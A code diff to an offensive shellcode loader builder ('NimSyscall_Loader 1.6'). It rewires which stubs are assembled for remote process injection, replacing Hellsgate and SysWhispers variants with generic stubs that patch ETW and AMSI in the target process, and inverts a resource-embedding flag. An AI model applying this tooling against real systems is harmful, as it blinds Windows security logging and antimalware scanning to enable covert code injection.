@@ -206,7 +206,7 @@ var
     sleepycrypt: bool = false
     fluctuate: bool = false
     noDInvoke: bool = false
-    noRES: bool = false
+    noRES: bool = true
     antidebug: bool = false
 
 let args = docopt(helpmenu, version = "NimSyscall_Loader 1.6")
@@ -1161,18 +1161,22 @@ if (peload):
             if (processname == ""):
                 stub.add(NotepadProcIDStub)
                 if (remoteETWpatch):
-                    stub.add(HellsgateRemotePatchETWStub)
+                    stub.add(RemoteLoadNTDLLStub)
+                    stub.add(RemotePatchETWStub)
                 if (remoteAMSIpatch):
-                    stub.add(HellsgateRemotePatchAMSIStub)
+                    stub.add(RemoteLoadAMSIStub)
+                    stub.add(RemotePatchAMSIStub)
                 stub.add(ShellcoderemoteinjectStub_notepad)
             else:
                 stub.add(ShellcoderemoteinjectStub_customprocfirst)
                 stub.add(ShellcoderemoteinjectStub_customprocseccond)
                 stub.add(ShellcoderemoteinjectStub_customprocID)
                 if (remoteETWpatch):
-                    stub.add(HellsgateRemotePatchETWStub)
+                    stub.add(RemoteLoadNTDLLStub)
+                    stub.add(RemotePatchETWStub)
                 if (remoteAMSIpatch):
-                    stub.add(HellsgateRemotePatchAMSIStub)
+                    stub.add(RemoteLoadAMSIStub)
+                    stub.add(RemotePatchAMSIStub)
                 stub.add(ShellcoderemoteinjectStub_customprocthird)
             stub.add(ShellcoderemoteinjectStub)
 
@@ -1194,35 +1198,43 @@ if (shellcode):
             if (processname == ""):
                 stub.add(NotepadProcIDStub)
                 if (remoteETWpatch):
-                    stub.add(HellsgateRemotePatchETWStub)
+                    stub.add(RemoteLoadNTDLLStub)
+                    stub.add(RemotePatchETWStub)
                 if (remoteAMSIpatch):
-                    stub.add(HellsgateRemotePatchAMSIStub)
+                    stub.add(RemoteLoadAMSIStub)
+                    stub.add(RemotePatchAMSIStub)
                 stub.add(ShellcoderemoteinjectStub_notepad)
             else:
                 stub.add(ShellcoderemoteinjectStub_customprocfirst)
                 stub.add(ShellcoderemoteinjectStub_customprocseccond)
                 stub.add(ShellcoderemoteinjectStub_customprocID)
                 if (remoteETWpatch):
-                    stub.add(HellsgateRemotePatchETWStub)
+                    stub.add(RemoteLoadNTDLLStub)
+                    stub.add(RemotePatchETWStub)
                 if (remoteAMSIpatch):
-                    stub.add(HellsgateRemotePatchAMSIStub)
+                    stub.add(RemoteLoadAMSIStub)
+                    stub.add(RemotePatchAMSIStub)
                 stub.add(ShellcoderemoteinjectStub_customprocthird)
         elif(syswhispers):
             if (processname == ""):
                 stub.add(NotepadProcIDStub)
                 if (remoteETWpatch):
-                    stub.add(WhispersRemotePatchETWStub)
+                    stub.add(RemoteLoadNTDLLStub)
+                    stub.add(RemotePatchETWStub)
                 if (remoteAMSIpatch):
-                    stub.add(WhispersRemotePatchAMSIStub)
+                    stub.add(RemoteLoadAMSIStub)
+                    stub.add(RemotePatchAMSIStub)
                 stub.add(ShellcoderemoteinjectStub_notepad)
             else:
                 stub.add(ShellcoderemoteinjectStub_customprocfirst)
                 stub.add(ShellcoderemoteinjectStub_customprocseccond)
                 stub.add(ShellcoderemoteinjectStub_customprocID)
                 if (remoteETWpatch):
-                    stub.add(WhispersRemotePatchETWStub)
+                    stub.add(RemoteLoadNTDLLStub)
+                    stub.add(RemotePatchETWStub)
                 if (remoteAMSIpatch):
-                    stub.add(WhispersRemotePatchAMSIStub)
+                    stub.add(RemoteLoadAMSIStub)
+                    stub.add(RemotePatchAMSIStub)
                 stub.add(ShellcoderemoteinjectStub_customprocthird)
         elif (getfreshstub):
             stub.add(RemoteInjectDelegates)
@@ -1340,7 +1352,7 @@ if embeddedArguments:
 if (big):
     basicCompileFlags.add("--maxLoopIterationsVM:1000000000 ")
 
-if (not noRES):
+if (noRES):
     if (dll_out):
         when system.hostOS == "windows":
             basicCompileFlags.add(fmt"--passL:{packerPath}\\resource\\dll.o ")
